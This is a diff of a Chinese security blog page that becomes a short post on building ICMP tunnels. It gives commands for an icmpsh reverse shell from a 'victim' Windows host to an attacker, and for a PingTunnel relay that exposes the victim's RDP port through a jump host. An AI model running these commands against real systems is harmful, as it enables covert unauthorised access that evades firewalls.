@@ -6,15 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>不知名网络安全选手的博客</title>
+  <title>ICMP隧道搭建 | 不知名网络安全选手的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="不知名网络安全选手的博客">
-<meta property="og:url" content="https://yd0ng.github.io/page/7/index.html">
+  <meta name="description" content="ICMP通信隧道搭建~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ICMP隧道搭建">
+<meta property="og:url" content="https://yd0ng.github.io/2020/08/31/ICMP%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/index.html">
 <meta property="og:site_name" content="不知名网络安全选手的博客">
+<meta property="og:description" content="ICMP通信隧道搭建~">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yd0ng.github.io/2020/08/31/ICMP%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/1.png">
+<meta property="article:published_time" content="2020-08-31T06:30:02.000Z">
+<meta property="article:modified_time" content="2020-08-31T07:20:34.716Z">
 <meta property="article:author" content="yd0ng">
+<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yd0ng.github.io/2020/08/31/ICMP%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/1.png">
   
   
     <link rel="icon" href="/themes/yilia/source/">
@@ -130,37 +137,79 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-计组复习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-ICMP隧道搭建" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/">计组复习</a>
+    <h1 class="article-title" itemprop="name">
+      ICMP隧道搭建
     </h1>
   
 
         
-        <a href="/2020/01/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2020-01-02T13:07:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-02</time>
+        <a href="/2020/08/31/ICMP%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" class="archive-article-date">
+  	<time datetime="2020-08-31T06:30:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>大三上计组上课也没好好听课，老师给划的重点也和没划差不太多，只能硬着头皮来看书理解。这学期用的是还没出版的新教材，用的RISCV指令集。简单记录一下自己复习计组觉得重要的知识点。</p>
-        
-          <a class="article-more-a" href="/2020/01/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/#more">more >></a>
-        
+        <p>ICMP通信隧道搭建~</p>
+<a id="more"></a>
+
+<h1 id="1-icmpsh搭建通信隧道"><a href="#1-icmpsh搭建通信隧道" class="headerlink" title="1. icmpsh搭建通信隧道"></a>1. icmpsh搭建通信隧道</h1><p>攻击机(debian/ubuntu)配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh</span><br><span class="line">apt-get install python-impacket</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br><span class="line">cd icmpsh</span><br><span class="line">python attack_ip victim_ip</span><br></pre></td></tr></table></figure>
+<p>受害机(windows)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcmpsh.exe -t attack_ip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/31/ICMP%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/1.png" alt></p>
+<h1 id="2-PingTunnel搭建通信隧道"><a href="#2-PingTunnel搭建通信隧道" class="headerlink" title="2. PingTunnel搭建通信隧道"></a>2. PingTunnel搭建通信隧道</h1><p>链接如下：<a href="http://freshmeat.sourceforge.net/projects/ptunnel/" target="_blank" rel="noopener">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p>
+<p>跳板机环境搭建</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># PingTunnel搭建</span><br><span class="line">wget http:&#x2F;&#x2F;freshmeat.sourceforge.net&#x2F;urls&#x2F;f7770b6af3089face1ee4890eac8cee1</span><br><span class="line">tar xf f7770b6af3089face1ee4890eac8cee1</span><br><span class="line">cd PingTunnel&#x2F;</span><br><span class="line">wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.9.0.tar.gz</span><br><span class="line">tar zxvf libpcap-1.9.0.tar.gz</span><br><span class="line">cd libpcap-1.9.0&#x2F;</span><br><span class="line">apt-get install -y flex byacc</span><br><span class="line">.&#x2F;configure</span><br><span class="line">mv .&#x2F;* ..</span><br><span class="line">cd ..&#x2F;</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">ptunnel -x shuteer</span><br></pre></td></tr></table></figure>
+
+<p>VPS环境搭建</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># PingTunnel搭建</span><br><span class="line">wget http:&#x2F;&#x2F;freshmeat.sourceforge.net&#x2F;urls&#x2F;f7770b6af3089face1ee4890eac8cee1</span><br><span class="line">tar xf f7770b6af3089face1ee4890eac8cee1</span><br><span class="line">cd PingTunnel&#x2F;</span><br><span class="line">wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.9.0.tar.gz</span><br><span class="line">tar zxvf libpcap-1.9.0.tar.gz</span><br><span class="line">cd libpcap-1.9.0&#x2F;</span><br><span class="line">apt-get install -y flex byacc</span><br><span class="line">.&#x2F;configure</span><br><span class="line">mv .&#x2F;* ..</span><br><span class="line">cd ..&#x2F;</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">ptunnel -p jump_host -lp 1080 -da victim_host -dp 3389 -x shuteer</span><br></pre></td></tr></table></figure>
+<p>至此，访问vps的1080端口，即借助跳板机访问受害机器的3389端口。</p>
+
       
       
     
       <div class="declare" hidden="hidden"></div>
     
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢您的打赏，大家一起加油喔~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/weixin.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -171,7 +220,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术文档</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
         		</li>
       		
 		</ul>
@@ -180,16 +229,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/08/31/ICMP%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2020/08/31/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">隐藏通信隧道技术</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -204,263 +312,43 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-<!--显示阅读次数-->
-
-
-  
-    <article id="post-2020日记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/01/2020%E6%97%A5%E8%AE%B0/">2020日记</a>
-    </h1>
-  
-
-        
-        <a href="/2020/01/01/2020%E6%97%A5%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-01-01T14:24:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        记录2020年的点点滴滴~
-        
-          <a class="article-more-a" href="/2020/01/01/2020%E6%97%A5%E8%AE%B0/#more">more >></a>
-        
-      
-      
-    
-      <div class="declare" hidden="hidden"></div>
-    
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">随手小记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/01/2020%E6%97%A5%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-icmpsh搭建通信隧道"><span class="toc-number">1.</span> <span class="toc-text">1. icmpsh搭建通信隧道</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-PingTunnel搭建通信隧道"><span class="toc-number">2.</span> <span class="toc-text">2. PingTunnel搭建通信隧道</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-<!--显示阅读次数-->
-
-
   
-    <article id="post-Flag-for-2020" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/01/Flag-for-2020/">Flag-for-2020</a>
-    </h1>
   
 
-        
-        <a href="/2020/01/01/Flag-for-2020/" class="archive-article-date">
-  	<time datetime="2019-12-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="记录一下2020年的flag，以此自勉"><a href="#记录一下2020年的flag，以此自勉" class="headerlink" title="记录一下2020年的flag，以此自勉"></a>记录一下2020年的flag，以此自勉</h1><p>接受自我，做真实的自己，“人生如逆途，我亦是行人”。</p>
-        
-          <a class="article-more-a" href="/2020/01/01/Flag-for-2020/#more">more >></a>
-        
-      
-      
-    
-      <div class="declare" hidden="hidden"></div>
-    
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">随手小记</a>
-        		</li>
-      		
-		</ul>
-	</div>
+  
 
-      
+  
 
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/01/Flag-for-2020/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
+  
 
 <!--显示阅读次数-->
 
-
-  
-    <article id="post-2019年度总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">2019年度总结</a>
-    </h1>
-  
-
-        
-        <a href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2019-12-31T15:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        2019年终于过去，进入了大三也已经半年，今天结束了编译原理的期末考试，距离下一场计组还有六天的时间，停下来转眼看看这一年，并简单记录一下这一年的自我感受。
-        
-          <a class="article-more-a" href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#more">more >></a>
-        
-      
-      
-    
-      <div class="declare" hidden="hidden"></div>
-    
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">随手小记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/12/31/2019%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-<!--显示阅读次数-->
-
-
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/6/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span>
-    </nav>
-  
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
 
 
           </div>
@@ -499,8 +387,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
